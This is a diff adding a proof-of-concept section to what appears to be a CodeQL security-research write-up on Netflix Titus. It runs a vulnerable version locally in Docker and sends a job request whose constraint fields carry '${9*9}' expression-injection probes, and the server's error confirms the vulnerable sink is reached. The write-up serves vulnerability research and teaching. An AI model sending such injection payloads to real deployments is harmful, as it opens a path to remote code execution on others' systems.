@@ -326,9 +326,72 @@ At the end, our final predicate for `isAdditionalTaintStep` is:
 Excellent, we have located the two vulnerable injection points and our query is robust enough to detect some edge cases. It is time to move to the exploitation part.
 
 # Step 4: Exploit and remediation
-## Step 4.1:
+## Step 4.1: PoC
 ### Running Netflix Titus
-Running the vulnerable version of Netflix Titus was easy as they provide Docker images. 
+For this we can take the easiest route. We start by grabbing the vulnerable tag of Netflix Titus from Github and running the provided Docker images. 
+```
+git clone https://github.com/Netflix/titus-control-plane.git
+git checkout tags/v0.1.1-rc.263 -b master
+docker-compose build
+docker-compose up -d
+```
+If you are running Windows and it fails, you might need to adjust the new line handling configuration:
+```
+git config core.autocrlf false
+```
+Finally, you can verify the service is online by checking port 7001 with the URL `/api/v2/status`:
+```
+curl localhost:7001/api/v2/status
+```
+Time to hunt for that injection point. By inspecting the results given by CodeQL, the error message in the vulnerable call gives us a very user-friendly error. It seems we need to send non-unique key names for softConstraints and hardConstraints to trigger the vulnerable call:
+
+```
+context.buildConstraintViolationWithTemplate(
+                "Soft and hard constraints not unique. Shared constraints: " + common
+        ).addConstraintViolation().disableDefaultConstraintViolation();
+```
+From CodeQL we also know it happens to the `Container` object type. The first thing we need to know is how to schedule a container job so our funtion gets triggered. We look for this in the documentation and the template to schedule a job is listed on the project's README file:
+```json
+curl localhost:7001/api/v3/jobs \
+  -X POST -H "Content-type: application/json" -d \
+  '{
+    "applicationName": "localtest",
+    "owner": {"teamEmail": "me@me.com"},
+    "container": {
+      "image": {"name": "alpine", "tag": "latest"},
+      "entryPoint": ["/bin/sleep", "1h"],
+      "securityProfile": {"iamRole": "test-role", "securityGroups": ["sg-test"]}
+    },
+    "batch": {
+      "size": 1,
+      "runtimeLimitSec": "3600",
+      "retryPolicy":{"delayed": {"delayMs": "1000", "retries": 3}}
+    }
+  }'
+  ```
+  Now we can create a job but there is nothing about constraints there. By querying `/api/v3/jobs` I found the complete structure of the message included soft and hard constraints. Now, we can send our first injection attempt:
+```
+{
+    "applicationName": "localtest",
+    "owner": {"teamEmail": "me@me.com"},
+    "container": {
+      "image": {"name": "alpine2", "tag": "latest"},
+      "entryPoint": ["/bin/sleep", "1h"],
+      "securityProfile": {"iamRole": "test-role", "securityGroups": ["sg-test"]},
+      "hardConstraints": {"constraints": {"${9*9}":"a"}, "expression": "${9*9}"},
+      "softConstraints": {"constraints": {"${9*9}":"a"}, "expression": "${9*9}"}
+    },
+    "batch": {
+      "size": 1,
+      "runtimeLimitSec": "3600",
+      "retryPolicy":{"delayed": {"delayMs": "1000", "retries": 3}}
+    }
+  }
+```
+This failed but gave me confirmation that we are hitting the right sink as I now see the same error message I was expecting:
+```
+{"statusCode":400,"message":"Invalid Argument: {Validation failed: 'field: 'container.hardConstraints', description: 'Unrecognized constraints [${9*9}]', type: 'HARD''}, {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [${9*9}]', type: 'HARD''}, {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [${9*9}]', type: 'HARD''}"}
+```
 ## Step 4.2:
 
 
